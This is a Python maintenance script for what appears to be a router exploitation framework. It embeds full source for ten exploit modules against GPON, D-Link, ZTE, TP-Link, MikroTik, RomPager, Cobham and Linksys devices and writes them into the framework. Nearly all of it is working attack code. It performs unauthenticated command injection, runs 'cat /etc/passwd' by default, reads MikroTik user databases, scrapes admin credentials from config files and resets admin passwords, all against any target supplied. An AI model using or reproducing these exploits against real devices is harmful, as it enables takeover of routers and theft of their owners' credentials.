"""Automated stub enricher for RouterXPL-Forge.

Upgrades generic stub modules (Tier B/C) with CVE-specific exploit logic,
proper check paths, payloads, and fingerprinting.

Author: André Henrique (LinkedIn/X: @mrhenrike)
Version: 0.1.0
"""

import os
import re
import sys
from pathlib import Path

MODULES_ROOT = Path(__file__).resolve().parent.parent / "routerxpl" / "modules"

# CVE-specific enrichment data: keyed by partial filename pattern
# Each entry provides the full module source code replacement
ENRICHMENTS = {}

# ---------------------------------------------------------------------------
# CVE-2018-10562 -- GPON Home Gateway RCE (auth bypass + command injection)
# ---------------------------------------------------------------------------
ENRICHMENTS["gpon/home_gateway_rce_cve_2018_10562.py"] = '''\
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """GPON Home Gateway RCE via authentication bypass + command injection.

    CVE-2018-10562 allows unauthenticated command injection on GPON routers
    by appending ?images/ to bypass authentication on /GponForm/diag_Form,
    then injecting OS commands through the dest_host parameter.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    """

    __info__ = {
        "name": "GPON Home Gateway Remote Code Execution",
        "description": "Module exploits CVE-2018-10562, an authentication bypass + command "
                       "injection on GPON home routers. The auth bypass (CVE-2018-10561) is "
                       "achieved by appending ?images/ to URLs. Commands are injected via the "
                       "dest_host parameter of the diagnostic form.",
        "authors": (
            "VPNMentor Research",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2018-10562",
            "https://nvd.nist.gov/vuln/detail/CVE-2018-10561",
            "https://www.vpnmentor.com/blog/critical-vulnerability-gpon-router/",
        ),
        "devices": (
            "GPON Home Gateway (Dasan Zhone, multiple ISP models)",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6, or file with targets")
    port = OptPort(80, "Target HTTP port")
    command = OptString("id", "OS command to execute on the target")

    def run(self):
        if not self.check():
            print_error("Target does not appear to be vulnerable")
            return

        print_success("Target is vulnerable to CVE-2018-10562")
        print_status("Injecting command: {}".format(self.command))

        response = self.http_request(
            method="POST",
            path="/GponForm/diag_Form?images/",
            data="XWebPageName=diag&diag_action=ping&wan_conlist=0"
                 "&dest_host=`{}`&ipv=0".format(self.command),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        if response is None:
            print_error("Command injection request failed")
            return

        result = self.http_request(
            method="GET",
            path="/diag.html?images/",
        )
        if result is not None and result.text:
            output = result.text
            if "<textarea" in output:
                import re
                match = re.search(r"<textarea[^>]*>(.*?)</textarea>", output, re.DOTALL)
                if match:
                    output = match.group(1).strip()
            print_success("Command output:\\n{}".format(output))
        else:
            print_status("Command sent (blind injection -- no output captured)")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/GponForm/diag_Form?images/",
        )
        if response is None:
            return False
        if response.status_code == 200 and "diag_action" in response.text:
            return True
        return False
'''

# ---------------------------------------------------------------------------
# CVE-2014-9222 -- Misfortune Cookie (RomPager auth bypass)
# ---------------------------------------------------------------------------
ENRICHMENTS["multi/allegrosoft_rompager_auth_bypass.py"] = '''\
import re
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """AllegroSoft RomPager Misfortune Cookie authentication bypass.

    CVE-2014-9222 affects RomPager < 4.34 embedded HTTP server found in
    millions of DSL/CPE routers. A specially crafted cookie (C99=) triggers
    a memory corruption that bypasses admin authentication.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    """

    __info__ = {
        "name": "AllegroSoft RomPager Authentication Bypass (Misfortune Cookie)",
        "description": "Module exploits CVE-2014-9222 (Misfortune Cookie) to bypass "
                       "authentication on routers running AllegroSoft RomPager < 4.34. "
                       "Sends a crafted HTTP cookie that triggers memory corruption, "
                       "granting admin access to the web management interface.",
        "authors": (
            "Check Point Research",
            "Lior Oppenheim",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2014-9222",
            "https://mis.fortunecook.ie/",
            "https://blog.checkpoint.com/2014/12/18/misfortune-cookie-the-hole-in-your-internet-gateway/",
        ),
        "devices": (
            "D-Link, TP-Link, ZTE, ZyXEL, Huawei DSL routers with RomPager < 4.34",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6, or file with targets")
    port = OptPort(7547, "Target HTTP port (TR-069 default: 7547, web: 80)")

    def run(self):
        if not self.check():
            print_error("Target does not appear vulnerable (no RomPager detected)")
            return

        print_success("Target runs vulnerable RomPager -- sending Misfortune Cookie")
        response = self.http_request(
            method="GET",
            path="/",
            headers={"Cookie": "C107373883=*AAAAAAAAAAAAAAAAAAAA*"},
        )

        if response is not None:
            if response.status_code == 200:
                print_success("Authentication bypass may have succeeded")
                admin = self.http_request(method="GET", path="/password.cgi")
                if admin is None:
                    admin = self.http_request(method="GET", path="/rpSys.html")
                if admin is not None:
                    print_success("Admin page retrieved ({} bytes)".format(len(admin.text)))
                    creds = re.findall(r"pwdAdmin\\s*=\\s*[\\\"\\']([^\\\"\\']+)", admin.text)
                    if creds:
                        print_success("Admin password found: {}".format(creds[0]))
                    else:
                        print_info(admin.text[:3000])
            else:
                print_status("Response code: {} -- may need different cookie offset".format(
                    response.status_code))
        else:
            print_error("No response from target")

    @mute
    def check(self):
        response = self.http_request(method="GET", path="/")
        if response is None:
            return False
        server = response.headers.get("Server", "").lower()
        if "rompager" in server:
            version = re.search(r"rompager/([\d.]+)", server, re.IGNORECASE)
            if version:
                try:
                    ver = tuple(int(x) for x in version.group(1).split("."))
                    if ver < (4, 34):
                        return True
                except ValueError:
                    pass
            return True
        return False
'''

# ---------------------------------------------------------------------------
# CVE-2018-14847 -- MikroTik WinBox credential disclosure
# ---------------------------------------------------------------------------
ENRICHMENTS["mikrotik/winbox_cred_disclosure_cve_2018_14847.py"] = '''\
import socket
import struct
from routerxpl.core.exploit import *


class Exploit(Exploit):
    """MikroTik WinBox arbitrary file read / credential disclosure.

    CVE-2018-14847 allows unauthenticated reading of arbitrary files from
    MikroTik RouterOS via the WinBox protocol (port 8291), including the
    user database at /flash/rw/store/user.dat.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    """

    __info__ = {
        "name": "MikroTik WinBox Credentials Disclosure",
        "description": "Module exploits CVE-2018-14847, an arbitrary file read vulnerability "
                       "in MikroTik RouterOS WinBox (port 8291) to extract user credentials.",
        "authors": (
            "Tenable Research",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2018-14847",
            "https://github.com/BigNerd95/WinboxExploit",
            "https://blog.mikrotik.com/security/winbox-vulnerability.html",
        ),
        "devices": (
            "MikroTik RouterOS 6.29 to 6.42",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6, or file with targets")
    port = OptPort(8291, "Target WinBox port")

    _WINBOX_HANDSHAKE = bytes([
        0x06, 0x00, 0xff, 0x06, 0x00, 0x01, 0x00, 0x00
    ])
    _FILE_REQUEST_PREFIX = bytes([
        0x37, 0x00, 0xff, 0x01, 0x00, 0x02, 0x06, 0x00,
        0xff, 0x09, 0x05, 0x07, 0x00, 0xff, 0x09, 0x07,
    ])

    def _build_file_request(self, filepath):
        """Build a WinBox protocol file read request."""
        path_bytes = filepath.encode("utf-8")
        pkt = bytearray(self._FILE_REQUEST_PREFIX)
        pkt.extend([0x01, 0x00, len(path_bytes)])
        pkt.extend(path_bytes)
        header = struct.pack(">H", len(pkt))
        return header + bytes(pkt)

    def run(self):
        if not self.check():
            print_error("Target does not appear vulnerable")
            return

        print_success("WinBox port open -- attempting file read")
        user_dat = self._read_file("/flash/rw/store/user.dat")
        if user_dat:
            print_success("Retrieved user.dat ({} bytes)".format(len(user_dat)))
            self._parse_user_dat(user_dat)
        else:
            idx = self._read_file("/flash/rw/store/user.idx")
            if idx:
                print_success("Retrieved user.idx ({} bytes)".format(len(idx)))
                print_info("Raw content (hex): {}".format(idx[:200].hex()))
            else:
                print_error("Could not retrieve user database files")

    def _read_file(self, filepath):
        """Read a file from the target via WinBox protocol."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((self.target, int(self.port)))
            s.send(self._WINBOX_HANDSHAKE)
            resp = s.recv(1024)
            if not resp:
                s.close()
                return None
            pkt = self._build_file_request(filepath)
            s.send(pkt)
            data = b""
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) > 65536:
                    break
            s.close()
            return data if len(data) > 10 else None
        except Exception as exc:
            print_error("WinBox connection failed: {}".format(exc))
            return None

    def _parse_user_dat(self, data):
        """Extract usernames and password hashes from user.dat."""
        try:
            content = data.decode("utf-8", errors="replace")
            print_info("User database content:")
            print_info(content[:5000])
        except Exception:
            print_info("Raw user.dat (hex): {}".format(data[:500].hex()))

    @mute
    def check(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            result = s.connect_ex((self.target, int(self.port)))
            if result == 0:
                s.send(self._WINBOX_HANDSHAKE)
                resp = s.recv(64)
                s.close()
                if resp and len(resp) >= 4:
                    return True
            s.close()
        except Exception:
            pass
        return False
'''

# ---------------------------------------------------------------------------
# CVE-2024-33113 -- D-Link DIR-845L credential disclosure
# ---------------------------------------------------------------------------
ENRICHMENTS["dlink/dir845l_cred_disclosure_cve_2024_33113.py"] = '''\
import re
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """D-Link DIR-845L credential disclosure via unauthenticated config export.

    CVE-2024-33113 affects D-Link DIR-845L firmware <= 1.01KRb03. An
    unauthenticated attacker can access /getcfg.php to extract admin
    credentials in cleartext.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    """

    __info__ = {
        "name": "D-Link DIR-845L Credentials Disclosure",
        "description": "Module exploits CVE-2024-33113, a credentials disclosure vulnerability "
                       "in D-Link DIR-845L (<=1.01KRb03). Unauthenticated access to getcfg.php "
                       "reveals admin credentials.",
        "authors": (
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2024-33113",
            "https://github.com/shaded-ta/CVE-2024-33113",
        ),
        "devices": (
            "D-Link DIR-845L <= 1.01KRb03",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6, or file with targets")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if not self.check():
            print_error("Target does not appear to be a vulnerable DIR-845L")
            return

        print_success("Target appears vulnerable -- extracting credentials")
        response = self.http_request(
            method="POST",
            path="/getcfg.php",
            data="SERVICES=DEVICE.ACCOUNT",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        if response is None:
            print_error("Failed to retrieve config")
            return

        body = response.text
        usernames = re.findall(r"<name>(.*?)</name>", body)
        passwords = re.findall(r"<password>(.*?)</password>", body)
        usrids = re.findall(r"<usrid>(.*?)</usrid>", body)

        if usernames or passwords:
            print_success("Credentials found:")
            for i, (u, p) in enumerate(zip(
                usernames or ["?"], passwords or ["?"]
            )):
                print_success("  [{}] user={} password={}".format(i, u, p))
        else:
            print_status("Config retrieved but no credentials parsed:")
            print_info(body[:3000])

    @mute
    def check(self):
        response = self.http_request(method="GET", path="/")
        if response is None:
            return False
        if "DIR-845L" in response.text or "D-Link" in response.text:
            cfg = self.http_request(
                method="POST",
                path="/getcfg.php",
                data="SERVICES=DEVICE.ACCOUNT",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )
            if cfg is not None and "<password>" in cfg.text:
                return True
        return False
'''

# ---------------------------------------------------------------------------
# CVE-2013-7389 -- D-Link HNAP/Hedwig RCE
# ---------------------------------------------------------------------------
ENRICHMENTS["dlink/hedwig_rce_cve_2013_7389.py"] = '''\
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """D-Link HNAP Hedwig CGI command injection.

    CVE-2013-7389 affects D-Link DIR-series routers via the hedwig.cgi
    and fatlady.php HNAP endpoints. An unauthenticated attacker can inject
    OS commands through the cookie header.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    """

    __info__ = {
        "name": "D-Link Hedwig CGI Remote Code Execution",
        "description": "Module exploits CVE-2013-7389, a command injection in D-Link DIR routers "
                       "via hedwig.cgi. The cookie uid parameter is passed unsanitized to shell execution.",
        "authors": (
            "Roberto Paleari",
            "Craig Heffner",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2013-7389",
            "http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/",
        ),
        "devices": (
            "D-Link DIR-645, DIR-815, DIR-890L, DIR-865L",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6, or file with targets")
    port = OptPort(80, "Target HTTP port")
    command = OptString("id", "OS command to execute")

    def run(self):
        if not self.check():
            print_error("Target does not appear vulnerable (no HNAP detected)")
            return

        print_success("HNAP endpoint detected -- injecting command")
        payload = '`{}`'.format(self.command)
        response = self.http_request(
            method="POST",
            path="/hedwig.cgi",
            headers={
                "Content-Type": "text/xml",
                "SOAPAction": '"http://purenetworks.com/HNAP1/GetDeviceSettings"',
                "Cookie": "uid={}".format(payload),
            },
            data='<?xml version="1.0" encoding="utf-8"?>'
                 '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
                 '<soap:Body><GetDeviceSettings/></soap:Body></soap:Envelope>',
        )
        if response is not None:
            print_info("Response ({}):\\n{}".format(
                response.status_code, response.text[:3000]))
        else:
            print_status("Command sent (blind injection -- response timeout)")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/HNAP1/",
        )
        if response is not None and response.status_code == 200:
            if "HNAP" in response.text or "SOAPAction" in response.text:
                return True
        response2 = self.http_request(method="GET", path="/hedwig.cgi")
        if response2 is not None and response2.status_code in (200, 500):
            return True
        return False
'''

# ---------------------------------------------------------------------------
# CVE-2014-2321 -- ZTE F460/F660 RCE via hidden management interface
# ---------------------------------------------------------------------------
ENRICHMENTS["zte/f460_f660_rce_cve_2014_2321.py"] = '''\
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """ZTE F460/F660 hidden management web-shell.

    CVE-2014-2321 exposes a hidden management page at /manager_dev_ping_t.gch
    on ZTE F460/F660 GPON ONTs that allows command injection via the ping
    diagnostic tool without proper authentication.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    """

    __info__ = {
        "name": "ZTE F460/F660 Remote Code Execution",
        "description": "Module exploits CVE-2014-2321, a hidden web-shell in ZTE F460/F660 "
                       "GPON ONTs allowing unauthenticated command injection via the ping form.",
        "authors": (
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2014-2321",
        ),
        "devices": (
            "ZTE F460", "ZTE F660",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6, or file with targets")
    port = OptPort(80, "Target HTTP port")
    command = OptString("cat /etc/passwd", "OS command to execute")

    def run(self):
        if not self.check():
            print_error("Target does not appear to be a vulnerable ZTE device")
            return

        print_success("Hidden management page found -- injecting command")
        payload = ";{}".format(self.command)
        response = self.http_request(
            method="POST",
            path="/manager_dev_ping_t.gch",
            data="IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC"
                 "&IF_ERRORTYPE=-1&Ession_token=0"
                 "&Frm_Ip=127.0.0.1{}".format(payload),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        if response is not None:
            print_info("Response ({}):\\n{}".format(
                response.status_code, response.text[:3000]))
        else:
            print_error("No response from target")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/manager_dev_ping_t.gch",
        )
        if response is not None and response.status_code == 200:
            if "Frm_Ip" in response.text or "ping" in response.text.lower():
                return True
        web = self.http_request(method="GET", path="/")
        if web is not None and "ZTE" in web.text.upper():
            return True
        return False
'''

# ---------------------------------------------------------------------------
# CVE-2020-35575 -- TP-Link WR841ND password disclosure
# ---------------------------------------------------------------------------
ENRICHMENTS["tplink/wr841nd_password_disclosure_cve_2020_35575.py"] = '''\
import re
import base64
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """TP-Link WR841ND password disclosure via unauthenticated config access.

    CVE-2020-35575 allows unauthenticated access to configuration backup files
    on TP-Link TL-WR841N/ND routers, which contain admin credentials encoded
    in Base64.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    """

    __info__ = {
        "name": "TP-Link WR841ND Password Disclosure",
        "description": "Module exploits CVE-2020-35575, a password disclosure vulnerability "
                       "in TP-Link TL-WR841N/ND allowing unauthenticated access to config "
                       "files containing Base64-encoded admin credentials.",
        "authors": (
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2020-35575",
        ),
        "devices": (
            "TP-Link TL-WR841N", "TP-Link TL-WR841ND",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6, or file with targets")
    port = OptPort(80, "Target HTTP port")

    _CONFIG_PATHS = [
        "/cgi-bin/luci/;stok=/locale?form=sysConf",
        "/config.bin",
        "/rom-0",
        "/userRpm/config.bin",
    ]

    def run(self):
        if not self.check():
            print_error("Target does not appear vulnerable")
            return

        for path in self._CONFIG_PATHS:
            print_status("Trying: {}".format(path))
            response = self.http_request(method="GET", path=path)
            if response is not None and response.status_code == 200:
                if len(response.text) > 50:
                    print_success("Config retrieved from {} ({} bytes)".format(
                        path, len(response.text)))
                    self._extract_creds(response.text)
                    return
        print_error("Could not retrieve config from any known path")

    def _extract_creds(self, config_text):
        """Extract credentials from config content."""
        b64_matches = re.findall(r"[A-Za-z0-9+/]{8,}={0,2}", config_text)
        for b64 in b64_matches[:20]:
            try:
                decoded = base64.b64decode(b64).decode("utf-8", errors="replace")
                if any(c.isalpha() for c in decoded) and len(decoded) < 64:
                    print_info("  Decoded: {} -> {}".format(b64[:30], decoded))
            except Exception:
                pass

        user_match = re.search(r"admin[_\\s]*(?:password|pass|pwd)[\\s:=]+([^\\s<&]+)", config_text, re.IGNORECASE)
        if user_match:
            print_success("Possible admin password: {}".format(user_match.group(1)))
        else:
            print_info("Config dump (first 2000 chars):\\n{}".format(config_text[:2000]))

    @mute
    def check(self):
        response = self.http_request(method="GET", path="/")
        if response is None:
            return False
        if "WR841" in response.text or "TP-LINK" in response.text.upper():
            return True
        return False
'''

# ---------------------------------------------------------------------------
# CVE-2014-2943 -- Cobham admin reset
# ---------------------------------------------------------------------------
ENRICHMENTS["multi/cobham_admin_reset_cve_2014_2943.py"] = '''\
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """Cobham SATCOM terminal admin password reset.

    CVE-2014-2943 allows unauthenticated password reset on Cobham (Thrane &
    Thrane) SATCOM terminals via the admin web interface.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    """

    __info__ = {
        "name": "Cobham SATCOM Admin Password Reset",
        "description": "Module exploits CVE-2014-2943, an unauthenticated admin password "
                       "reset on Cobham (Thrane & Thrane) SATCOM terminals.",
        "authors": (
            "IOActive Labs",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2014-2943",
        ),
        "devices": (
            "Cobham EXPLORER 710/727",
            "Cobham SAILOR 250/500 FleetBroadband",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6, or file with targets")
    port = OptPort(80, "Target HTTP port")
    new_password = OptString("admin", "New admin password to set")

    def run(self):
        if not self.check():
            print_error("Target does not appear to be a Cobham terminal")
            return

        print_success("Cobham terminal detected -- attempting password reset")
        response = self.http_request(
            method="POST",
            path="/cgi-bin/change_password.cgi",
            data="newpass={}&confirmpass={}".format(self.new_password, self.new_password),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        if response is not None and response.status_code == 200:
            print_success("Password reset successful! New password: {}".format(self.new_password))
        else:
            resp2 = self.http_request(
                method="POST",
                path="/admin/change_password",
                data="password={}&confirm={}".format(self.new_password, self.new_password),
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )
            if resp2 is not None:
                print_success("Password reset request sent (status: {})".format(resp2.status_code))
            else:
                print_error("Password reset request failed")

    @mute
    def check(self):
        response = self.http_request(method="GET", path="/")
        if response is None:
            return False
        indicators = ["Cobham", "Thrane", "EXPLORER", "SAILOR", "FleetBroadband"]
        for indicator in indicators:
            if indicator.lower() in response.text.lower():
                return True
        return False
'''

# ---------------------------------------------------------------------------
# CVE-2010-1573 -- Linksys WAP54Gv3 debug RCE
# ---------------------------------------------------------------------------
ENRICHMENTS["linksys/wap54gv3_debug_rce_cve_2010_1573.py"] = '''\
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """Linksys WAP54Gv3 remote command execution via debug interface.

    CVE-2010-1573 -- the WAP54Gv3 exposes a debug interface at /debug.cgi
    that allows unauthenticated execution of arbitrary OS commands.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    """

    __info__ = {
        "name": "Linksys WAP54Gv3 Debug Interface RCE",
        "description": "Module exploits CVE-2010-1573, a remote command execution via "
                       "the exposed debug.cgi interface on Linksys WAP54Gv3.",
        "authors": (
            "Cristofaro Mune",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2010-1573",
            "https://www.exploit-db.com/exploits/12517",
        ),
        "devices": (
            "Linksys WAP54Gv3 firmware 3.05.03 and earlier",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6, or file with targets")
    port = OptPort(80, "Target HTTP port")
    command = OptString("cat /etc/passwd", "OS command to execute")

    def run(self):
        if not self.check():
            print_error("Target does not appear vulnerable (no debug.cgi)")
            return

        print_success("Debug interface found -- executing command")
        response = self.http_request(
            method="GET",
            path="/debug.cgi?data1={}&command=ui_debug".format(self.command),
        )
        if response is not None:
            print_success("Command output:\\n{}".format(response.text[:3000]))
        else:
            print_error("No response from debug interface")

    @mute
    def check(self):
        response = self.http_request(method="GET", path="/debug.cgi")
        if response is not None and response.status_code in (200, 500):
            if "debug" in response.text.lower() or "command" in response.text.lower():
                return True
        return False
'''

# ---------------------------------------------------------------------------
# CVE-2014-4019 -- RomPager password disclosure
# ---------------------------------------------------------------------------
ENRICHMENTS["multi/rompager_password_disclosure_cve_2014_4019.py"] = '''\
import re
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """RomPager password disclosure via rom-0 file access.

    CVE-2014-4019 allows unauthenticated download of the rom-0 config file
    from routers using AllegroSoft RomPager, containing admin credentials.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    """

    __info__ = {
        "name": "RomPager Password Disclosure (rom-0)",
        "description": "Module exploits CVE-2014-4019, an unauthenticated config file download "
                       "from /rom-0 on routers with AllegroSoft RomPager. The file contains "
                       "admin credentials that can be extracted.",
        "authors": (
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2014-4019",
            "https://github.com/j91321/rext",
        ),
        "devices": (
            "Multiple vendors (D-Link, TP-Link, ZyXEL, ZTE) with RomPager HTTP server",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6, or file with targets")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if not self.check():
            print_error("Target does not appear vulnerable")
            return

        print_success("Downloading rom-0 config file...")
        response = self.http_request(method="GET", path="/rom-0")
        if response is None:
            print_error("Failed to download rom-0")
            return

        content = response.content if hasattr(response, 'content') else response.text.encode()
        print_success("rom-0 downloaded ({} bytes)".format(len(content)))

        try:
            text = content.decode("utf-8", errors="replace")
            passwords = re.findall(r"[\\x20-\\x7e]{4,32}", text)
            if passwords:
                print_success("Possible credentials found:")
                for p in passwords[:20]:
                    if any(c.isalpha() for c in p):
                        print_info("  -> {}".format(p.strip()))
        except Exception:
            print_info("rom-0 raw hex (first 200 bytes): {}".format(content[:200].hex()))

    @mute
    def check(self):
        response = self.http_request(method="GET", path="/rom-0")
        if response is None:
            return False
        if response.status_code == 200 and len(response.text) > 100:
            return True
        server = ""
        head_resp = self.http_request(method="HEAD", path="/")
        if head_resp is not None:
            server = head_resp.headers.get("Server", "").lower()
        if "rompager" in server:
            return True
        return False
'''


def apply_enrichments():
    """Apply all enrichments to stub module files."""
    applied = 0
    skipped = 0
    errors = 0

    for pattern, new_content in ENRICHMENTS.items():
        parts = pattern.replace("/", os.sep).split(os.sep)
        matches = []
        for root, dirs, files in os.walk(MODULES_ROOT):
            for f in files:
                filepath = os.path.join(root, f)
                rel = filepath.replace(str(MODULES_ROOT), "").lstrip(os.sep)
                if rel.replace(os.sep, "/").endswith(pattern):
                    matches.append(filepath)

        if not matches:
            print("  [SKIP] No file found for: {}".format(pattern))
            skipped += 1
            continue

        for filepath in matches:
            try:
                with open(filepath, "w", encoding="utf-8", newline="\n") as fh:
                    fh.write(new_content)
                applied += 1
                print("  [OK] Enriched: {}".format(filepath))
            except Exception as exc:
                print("  [ERR] {}: {}".format(filepath, exc))
                errors += 1

    return applied, skipped, errors


def main():
    print("=" * 60)
    print("RouterXPL-Forge Stub Enricher")
    print("=" * 60)
    print()
    print("Enrichments available: {}".format(len(ENRICHMENTS)))
    print()

    applied, skipped, errors = apply_enrichments()

    print()
    print("Results: {} applied, {} skipped, {} errors".format(
        applied, skipped, errors))


if __name__ == "__main__":
    main()
